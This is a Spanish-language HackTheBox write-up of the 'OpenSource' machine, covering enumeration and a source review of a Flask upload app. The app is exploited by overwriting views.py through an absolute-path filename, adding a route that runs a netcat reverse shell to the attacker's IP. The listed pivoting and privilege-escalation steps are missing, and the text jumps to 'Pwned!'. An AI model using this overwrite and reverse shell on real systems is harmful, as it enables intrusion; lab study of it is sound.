---
title: OpenSource | Linux
published: 2025-08-27
image: "./logo.png"
tags: [Easy, Linux, ]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Web Enumeration
- Github Project Enumeration
- Information Leakage
- Abusing File Upload - Replacing Python Files [RCE]
- Local File Inclusion (LFI)
- Shell via Flask Debug - Finding out the PIN (Werkzeug Debugger) [Unintended Way]
- Playing with Chisel - Remote Port Forwarding [PIVOTING]
- Abusing Gitea + Information Leakage
- Abusing Cron Job + Git Hooks [Privilege Escalation]

### Preparación

- eWPT
- eWPTXv2
- OSWE
- eCPPTv3
- OSCP

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.11.164`       | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p22,80 10.10.11.164 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.11.164`       | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug httpd 2.1.2 (Python 3.10.3)
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Whatweb

Para enumerar las tecnologías que está utilizando el servicio web usaremos `whatweb`:

```bash wrap=false
❯ whatweb http://10.10.11.164
http://10.10.11.164 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.2 Python/3.10.3], IP[10.10.11.164], JQuery[3.4.1], Python[3.10.3], Script, Title[upcloud - Upload files for Free!], Werkzeug[2.1.2]
```

### Wfuzz

Para hacernos mejor a la idea de la estructura de la web vamos a probar **fuzzing** con la herramienta `wfuzz`:

```bash wrap=false
❯ wfuzz -c -L --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt http://10.10.11.164/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.164/FUZZ
Total requests: 29999

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000042:   200        9802 L   92977 W    2359649 Ch   "download"                                                                                                                                                                                                                          
000001450:   200        45 L     144 W      1563 Ch     "console" 
```

### source.zip

La ruta `/download` nos descarga un `source.zip`:

```bash wrap=false
❯ ls -la
drwxrwxr-x zelpro zelpro 4.0 KB Sat Sep 27 15:01:20 2025  .
drwxrwxr-x zelpro zelpro 4.0 KB Sat Sep 27 15:01:20 2025  ..
drwxrwxr-x zelpro zelpro 4.0 KB Sat Sep 27 15:01:22 2025  .git
drwxrwxr-x zelpro zelpro 4.0 KB Thu Apr 28 13:45:52 2022  app
drwxr-xr-x zelpro zelpro 4.0 KB Thu Apr 28 13:34:45 2022  config
.rwxr-xr-x zelpro zelpro 110 B  Thu Apr 28 13:40:20 2022  build-docker.sh
.rw-rw-r-- zelpro zelpro 574 B  Thu Apr 28 14:50:20 2022  Dockerfile
```

Vemos que tenemos una copia de la web incluyendo datos del repositorio. Dentro de `/app` existe `views.py`:

```python wrap=false title='views.py'
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Aquí podemos ver la estructura de la web, vemos que en la subida de archivos se aplica una sanitización para impedir subir archivos a otros directorios:

```python wrap=false title='utils.py'
import time

def current_milli_time():
    return round(time.time() * 1000)

"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""

def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

"""
TODO: get unique filename
"""

def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension

"""
Recursively replace a pattern in a string
"""

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

Por esa parte nos han capado, sin embargo en la siguiente línea está: `file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)`, que esto puede dar un problema muy grave:

```bash wrap=false
❯ python
Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.path.join(os.getcwd(), "public", "uploads", "zelpro.txt")
... 
'/home/zelpro/HTB/OpenSource/content/source/app/app/public/uploads/zelpro.txt'
>>> os.path.join(os.getcwd(), "public", "uploads", "/zelpro.txt")
'/zelpro.txt'
```

## Explotación

Si ponemos una `/` en el nombre se salta el resto de la ruta. Sabiendo que estamos en `/app/app/` podríamos sustituir el `views.py` por este:

```python wrap=false title='views.py (MODIFIED)'
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def cmd():
    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f")
```

Esto hace que la ruta `/shell` nos devuelva una **reverse shell** por el puerto que escojamos:

```bash wrap=false
❯ sudo nc -lvnp 4444
[sudo] contraseña para zelpro: 
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.164] 45081
/bin/sh: can't access tty; job control turned off
/app # whoami
root
/app # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
18: eth0@if19: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:09 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.9/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Vemos que estamos en un contenedor.







[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/121)

---